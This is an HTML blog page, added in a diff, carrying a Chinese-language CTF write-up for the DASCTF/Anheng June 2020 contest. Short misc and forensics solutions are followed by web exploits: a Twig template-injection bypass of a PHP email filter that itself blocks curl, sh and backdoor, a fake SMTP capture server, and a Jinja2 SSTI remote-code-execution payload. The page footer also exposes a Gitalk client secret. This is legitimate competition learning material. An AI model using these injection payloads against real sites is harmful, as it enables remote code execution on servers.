@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>安恒6月赛Writeup |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="安恒6月赛Writeup |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="安恒6月赛Writeup"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/kJFO1UEEF/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>安恒6月赛Writeup</h1>
+            <span class="meta">
+            	Posted on
+              2020-06-26，4 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="centermisccentercryptographic_call"><center>Misc</center><br>
+cryptographic_call</h1>
+<p>单图盲水印。得到Base64的码表。然后脚本跑一下</p>
+<pre><code>import base64
+import string
+string1=&quot;0123456789abcdefGHIJKLMNOPQrstuvwXYZghijklmnopqRSTUVW*ABCDEF@xyz&quot;
+string2=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;
+str1=&quot;PiTXPBoBd3OVOMdheMGSOZXXeJXXOJ1ge64WPMGBc3cCPJKDc7W=&quot;
+print(base64.b64decode(str1.translate(str.maketrans(string1,string2))))
+</code></pre>
+<h1 id="physicalhacker">PhysicalHacker</h1>
+<p>爆破密码得到一个wifi包。导出得到flag.txt<br>
+snow隐写一把梭</p>
+<h1 id="baiduyungcode">BaiduYun&amp;Gcode</h1>
+<p>百度云盘转存原理：判断文件前256KMD5是否相同。相同就从数据中链接同一个文件。并不是真的上传。<br>
+根据hint。得知X平台前 256KB相同。<br>
+下载X平台的图片。算出前256KB的md5。通过一个插件。<br>
+<code>https://rapid.acg.uy/</code><br>
+得到一个3D打印的文件。然后就在字符的背面。</p>
+<h1 id="keyboard">Keyboard</h1>
+<p>filescan得到一个keyboardlog<br>
+里面就是qwe密码。解密得到密钥<br>
+然后用取证大师,密钥挂载加密的镜像。然后ntfs隐写</p>
+<h1 id="透明度">透明度</h1>
+<p>A通道选满。得到一个压缩包。掩码爆破密码得到<br>
+nepnb。解压得到Flag</p>
+<h1 id="smb">SMB</h1>
+<p>sam文件。得到用户密码。当作密钥。依旧是取证大师。密钥挂载镜像。然后得到一个rtf文件。16进制解密。很多乱码。中间有一串字符。base58得到flag</p>
+<h1 id="centerwebcentersubscribe"><center>Web</center><br>
+Subscribe</h1>
+<p>F12得到源码</p>
+<pre><code>function mailCheck($s) {
+    if (preg_match('/\\\|\/|\~|&amp;|\^|\`|\*|\?/i',$s))
+    {
+        alertMes('damn hacker!', './index.php');
+        return false;
+    }
+
+    if (!preg_match('/libs|smtp|curl|dev|index\.php|ftp|backdoor|sh/i', $s) )
+    {
+        if (  preg_match_all('/@/', $s) === 1 )
+        {
+            $arr = explode('@',$s);
+            $domain = end($arr);
+            if (!preg_match('/[^a-z0-9._-]/i', $domain))
+            {
+                return true;
+            }
+        }
+    }
+
+    return false;
+}
+$smtpEmailTo = $_POST['toemail'];
+
+if (!mailCheck($smtpEmailTo))
+{
+    alertMes(&quot;hacker&quot;, &quot;/index.php&quot;); //die;
+}
+$twig = new Twig_Environment($loader);
+$yourName = pos(explode( '@', $smtpEmailTo));
+$content = @$twig-&gt;render($yourName);
+$mailcontent = &quot;&lt;h1&gt;Hello &lt;font color=red&gt;&quot;.$content.&quot;&lt;/font&gt;&lt;br&gt;Welcome to DASCTF June, Have FUN!&lt;/h1&gt;&quot;;
+$smtp = new Smtp($smtpserver, $smtpserverport, true, $smtpuser, $smtppass);
+$state = $smtp-&gt;sendmail($smtpEmailTo, $smtpusermail, $mailtitle, 
+</code></pre>
+<p>前面第一个函数就是用来限制用户名的。不能包含正则中的符号。有就直接die<br>
+第二个正则。是用来判断SMTP的域名是否是xx.xx格式的<br>
+绕过这个后。可以看到。它会取用户名。然后render渲染。放入html。进行发送。<br>
+只要用户名是恶意的payload。然后邮箱域名是我们的域名即可。<br>
+至于payload。。网上一搜就有。构造下命令<br>
+<img src="https://guokeya.github.io/post-images/1593163413535.png" alt="" loading="lazy"><br>
+伪造SMTP服务的脚本</p>
+<pre><code>from __future__ import print_function
+from datetime import datetime
+import asyncore
+from smtpd import SMTPServer
+
+class EmlServer(SMTPServer):
+    no = 0
+    def process_message(self, peer, mailfrom, rcpttos, data, mail_options=None,rcpt_options=None):
+        filename = '%s-%d.eml' % (datetime.now().strftime('%Y%m%d%H%M%S'),
+                self.no)
+        f = open(filename, 'wb')
+        print(data)
+        f.write(data)
+        f.close
+        print('%s saved.' % filename)
+        self.no += 1
+
+
+def run():
+    foo = EmlServer(('0.0.0.0', 25), None)
+    try:
+        asyncore.loop()
+    except KeyboardInterrupt:
+        pass
+
+
+if __name__ == '__main__':
+    run()
+</code></pre>
+<h1 id="easy_flask">easy_flask</h1>
+<p>ssti部分和安恒二月赛差不多。<br>
+就是把request.args.x1改成request.headers.x1<br>
+因为ban了()|。可以在结果外边多加一个()。变成整体。从而绕过()|。<br>
+也可以中间加个空格绕过()空格|<br>
+最后就是RCE了</p>
+<pre><code>{{()|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)()|attr(request.headers.x4)(398)|attr(request.headers.x5)|attr(request.headers.x6)|attr(request.headers.x4)(request.headers.x7)|attr(request.headers.x4)(request.headers.x8)(request.headers.x9)}}
+</code></pre>
+<p>复现的时候。环境关了。。。。。</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/3kK-0Vkzq/">
+              <span class="post-title">
+                [Zer0pts2020]notepad(ssti+python反序列化)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
